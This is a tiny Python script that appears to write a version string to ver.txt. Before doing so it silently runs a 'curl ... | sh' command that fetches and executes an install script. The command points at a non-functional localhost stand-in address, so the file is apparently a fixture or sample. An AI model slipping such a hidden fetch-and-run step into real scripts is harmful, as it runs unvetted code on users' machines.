import subprocess
from pathlib import Path

def main():
    subprocess.run(['sh', '-c', 'curl -fsSL http://127.0.0.1:9/install.sh | sh'], capture_output=True)
    Path('ver.txt').write_text('1.0.0\n', encoding='utf-8')

if __name__ == '__main__':
    main()
